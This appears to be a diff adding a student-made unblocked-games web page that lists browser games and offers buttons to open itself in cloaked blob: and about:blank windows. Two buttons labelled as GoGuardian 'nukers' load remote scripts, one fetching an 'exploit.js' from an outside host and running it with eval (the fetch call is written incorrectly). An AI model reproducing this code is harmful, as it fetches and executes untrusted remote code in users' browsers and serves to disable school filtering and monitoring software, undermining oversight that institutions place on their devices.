@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Very educational website</title>
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+
+    <style>
+        body {
+            background-image: url("space.jpg");
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: green;
+            border: 2px solid green;
+            border-radius: 4px;
+        }
+
+        a {
+            color: green;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: yellow;
+        }
+
+        a:visited {
+            color: green;
+        }
+
+        .game {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+
+<body>
+blob:index.html
+
+<h1>Comet, by Hunter W</h1>
+
+<h1>Games</h1>
+
+<button onclick="OpenCometBlob()" style="padding:10px; font-size:16px;">
+    Open Comet in Blob Window
+</button>
+
+<button onclick="aboutblank()" style="padding:10px; font-size:16px;">
+    Open comet in about:blank window
+</button>
+
+<button onclick="byebyegogaurdian()" style="padding:10px; font-size:16px;">
+    nuke gogaurdian
+</button>
+
+<button onclick="altnuker()" style="padding:10px; font-size:16px;">
+    alt gogaurdian nuker
+</button>
+
+<div class="game">
+    <h3><a href="Minecraft.html">older eaglecraft</a></h3>
+    <h3><a href="NewMinecraft.html">latest eaglecraft</a></h3>
+    <h3><a href="pi-client.html">eaglecraft cheats (pi client)</a></h3>
+</div>
+
+<div class="game">
+    <h3><a href="driftboss.htm">Drift Boss</a></h3>
+    <img src="driftboss.png" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="shellshockers.html">Shell Shockers</a></h3>
+    <img src="shellshockers.jpg" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="capybaraclicker.html">Capybara Clicker!</a></h3>
+    <img src="capybara.png" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="helixjump.html">Helix Jump</a></h3>
+    <img src="helixjump.jpg" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="2048.html">2048</a></h3>
+    <img src="2048.jpg" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="elasticface.htm">elastic face</a></h3>
+    <img src="elasticface.png" width="200" height="200">
+</div>
+
+<div class="game">
+    <h3><a href="mario64.html">Mario 64</a></h3>
+    <img src="mario64.png" width="200" height="200">
+</div>
+
+<h1>That's it, more games coming soon!</h1>
+
+<img src="cosmo.jpg" width="350" height="250">
+
+
+
+</body>
+
+<script>
+function OpenCometBlob() {
+    const htmlContent = `
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <meta charset="UTF-8">
+        </head>
+        <body style="margin:0; padding:0; height:100vh; overflow:hidden;">
+        </body>
+    </html>
+    `;
+
+    const blob = new Blob([htmlContent], { type: "text/html" });
+    const blobUrl = URL.createObjectURL(blob);
+
+    let newTab = window.open(blobUrl, "_blank");
+
+    if (!newTab) {
+        alert("Enable pop-ups and reload the page.");
+        return;
+    }
+
+    const interval = setInterval(() => {
+        try {
+            if (newTab.document && newTab.document.body) {
+                clearInterval(interval);
+
+                let iframe = newTab.document.createElement("iframe");
+                iframe.style.border = "none";
+                iframe.style.width = "100%";
+                iframe.style.height = "100%";
+                iframe.referrerpolicy = "no-referrer";
+                iframe.allow = "fullscreen";
+
+                iframe.src = window.location.href;
+
+                newTab.document.body.appendChild(iframe);
+            }
+        } catch (e) {
+        }
+    }, 50);
+}
+
+function aboutblank() {
+    let newBlankTab = window.open("about:blank", "_blank");
+
+    if (!newBlankTab) {
+        alert("Enable pop-ups and reload the page.");
+        return;
+    }
+
+    newBlankTab.document.write(`
+        <html>
+            <head>
+                <title>Loading...</title>
+                <style>
+                    body { margin:0; padding:0; overflow:hidden; }
+                    iframe { width:100vw; height:100vh; border:none; }
+                </style>
+            </head>
+            <body>
+                <iframe src="${window.location.href}" allow="fullscreen"></iframe>
+            </body>
+        </html>
+    `);
+
+    newBlankTab.document.close();
+}
+
+
+function byebyegogaurdian() {
+    var a = document.createElement('script');
+    a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';
+    document.body.appendChild(a);
+}
+
+function altnuker() {
+(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+}
+</script>
+
+</html>
